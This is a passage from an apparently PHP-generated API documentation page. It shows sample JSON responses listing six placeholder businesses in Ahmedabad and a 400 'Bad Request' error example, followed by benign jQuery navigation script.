                                                                            <div class="hoverable"><span class="property">longitude</span>: <span class="type-string">"72"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">category</span>: <span class="type-string">"Meetups"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable">
                                                                                <span class="property">image</span>:
                                                                                <div class="collapser"></div>
                                                                                [<span class="ellipsis"></span>
                                                                                <ul class="array collapsible">
                                                                                    <li>
                                                                                        <div class="hoverable"><span class="type-string">"</span><a href="http://localhost/apps/businessapp/uploads/business/1.jpg">http://localhost/apps/businessapp/uploads/business/1.jpg</a><span class="type-string">"</span></div>
                                                                                    </li>
                                                                                </ul>
                                                                                ]
                                                                            </div>
                                                                        </li>
                                                                    </ul>
                                                                    },
                                                                </div>
                                                            </li>
                                                            <li>
                                                                <div class="hoverable hovered">
                                                                    <div class="collapser"></div>
                                                                    {<span class="ellipsis"></span>
                                                                    <ul class="obj collapsible">
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">id</span>: <span class="type-string">"2"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">name</span>: <span class="type-string">"Business-2"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">location</span>: <span class="type-string">"Ahmedabad"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">latitude</span>: <span class="type-string">"23"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">longitude</span>: <span class="type-string">"72"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">category</span>: <span class="type-string">"Business"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable">
                                                                                <span class="property">image</span>:
                                                                                <div class="collapser"></div>
                                                                                [<span class="ellipsis"></span>
                                                                                <ul class="array collapsible">
                                                                                    <li>
                                                                                        <div class="hoverable"><span class="type-string">"</span><a href="http://localhost/apps/businessapp/uploads/business/2.jpg">http://localhost/apps/businessapp/uploads/business/2.jpg</a><span class="type-string">"</span></div>
                                                                                    </li>
                                                                                </ul>
                                                                                ]
                                                                            </div>
                                                                        </li>
                                                                    </ul>
                                                                    },
                                                                </div>
                                                            </li>
                                                            <li>
                                                                <div class="hoverable">
                                                                    <div class="collapser"></div>
                                                                    {<span class="ellipsis"></span>
                                                                    <ul class="obj collapsible">
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">id</span>: <span class="type-string">"3"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">name</span>: <span class="type-string">"Business-3"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">location</span>: <span class="type-string">"Ahmedabad"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">latitude</span>: <span class="type-string">"23"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">longitude</span>: <span class="type-string">"72"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">category</span>: <span class="type-string">"Music"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable">
                                                                                <span class="property">image</span>:
                                                                                <div class="collapser"></div>
                                                                                [<span class="ellipsis"></span>
                                                                                <ul class="array collapsible">
                                                                                    <li>
                                                                                        <div class="hoverable"><span class="type-string">"</span><a href="http://localhost/apps/businessapp/uploads/business/3.jpg">http://localhost/apps/businessapp/uploads/business/3.jpg</a><span class="type-string">"</span></div>
                                                                                    </li>
                                                                                </ul>
                                                                                ]
                                                                            </div>
                                                                        </li>
                                                                    </ul>
                                                                    },
                                                                </div>
                                                            </li>
                                                            <li>
                                                                <div class="hoverable">
                                                                    <div class="collapser"></div>
                                                                    {<span class="ellipsis"></span>
                                                                    <ul class="obj collapsible">
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">id</span>: <span class="type-string">"4"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">name</span>: <span class="type-string">"Business-4"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">location</span>: <span class="type-string">"Ahmedabad"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">latitude</span>: <span class="type-string">"23"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">longitude</span>: <span class="type-string">"72"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">category</span>: <span class="type-string">"Dance"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable">
                                                                                <span class="property">image</span>:
                                                                                <div class="collapser"></div>
                                                                                [<span class="ellipsis"></span>
                                                                                <ul class="array collapsible">
                                                                                    <li>
                                                                                        <div class="hoverable"><span class="type-string">"</span><a href="http://localhost/apps/businessapp/uploads/business/4.jpg">http://localhost/apps/businessapp/uploads/business/4.jpg</a><span class="type-string">"</span></div>
                                                                                    </li>
                                                                                </ul>
                                                                                ]
                                                                            </div>
                                                                        </li>
                                                                    </ul>
                                                                    },
                                                                </div>
                                                            </li>
                                                            <li>
                                                                <div class="hoverable">
                                                                    <div class="collapser"></div>
                                                                    {<span class="ellipsis"></span>
                                                                    <ul class="obj collapsible">
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">id</span>: <span class="type-string">"5"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">name</span>: <span class="type-string">"Business-5"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">location</span>: <span class="type-string">"Ahmedabad"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">latitude</span>: <span class="type-string">"23"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">longitude</span>: <span class="type-string">"72"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">category</span>: <span class="type-string">"Workshop"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">image</span>: [ ]</div>
                                                                        </li>
                                                                    </ul>
                                                                    },
                                                                </div>
                                                            </li>
                                                            <li>
                                                                <div class="hoverable">
                                                                    <div class="collapser"></div>
                                                                    {<span class="ellipsis"></span>
                                                                    <ul class="obj collapsible">
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">id</span>: <span class="type-string">"6"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">name</span>: <span class="type-string">"Business-6"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">location</span>: <span class="type-string">"Ahmedabad"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">latitude</span>: <span class="type-string">"23"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">longitude</span>: <span class="type-string">"72"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">category</span>: <span class="type-string">"Arts"</span>,</div>
                                                                        </li>
                                                                        <li>
                                                                            <div class="hoverable"><span class="property">image</span>: [ ]</div>
                                                                        </li>
                                                                    </ul>
                                                                    }
                                                                </div>
                                                            </li>
                                                        </ul>
                                                        ]
                                                    </div>
                                                </li>
                                            </ul>
                                            }
                                        </div>
                                    </li>
                                </ul>
                                }
                            </div>
                        </div>
                        <h6>
                            <i class="fa fa-hand-o-right"></i> Error (Some required data not posted)
                        </h6>
                        <div class="highlight-js json">
                            <div class="collapser"></div>
                            {
                            <span class="ellipsis"></span>
                            <ul class="obj collapsible">
                                <li>
                                    <div class="hoverable">
                                        <span class="property">code</span>:
                                        <span class="type-number">400</span>,
                                    </div>
                                </li>
                                <li>
                                    <div class="hoverable">
                                        <span class="property">status</span>:
                                        <span class="type-string">"error"</span>,
                                    </div>
                                </li>
                                <li>
                                    <div class="hoverable">
                                        <span class="property">message</span>:
                                        <span class="type-string">"Bad Request"</span>
                                    </div>
                                </li>
                            </ul>
                            }
                        </div>
                    </div>
                    <?php
                    include 'get_city.php';
                    ?>
                    ?>
                    <footer>
                        <hr>
                        <div class="rst-footer-buttons right" role="navigation" aria-label="footer navigation">
                            <a target="_blank" href="http://www.amcodr.co">Amcodr</a>
                        </div>
                    </footer>
                </div>
    </section>

</div>                                                                                                                                                                                            <script type="text/javascript">
    var DOCUMENTATION_OPTIONS = {
        URL_ROOT:'./',
        VERSION:'1.5.0',
        COLLAPSE_INDEX:false,
        FILE_SUFFIX:'.html',
        HAS_SOURCE:  true
    };
</script>                                                                                                                                                                                            <script type="text/javascript" src="includes/jquery-2.0.3.min.js"></script>
<script type="text/javascript">
    jQuery(function () {
        $('.toctree-l1').click(function(){
            $('.current').removeClass('current');
            $(this).addClass('current');
        });
    });
</script>
</body>
</html>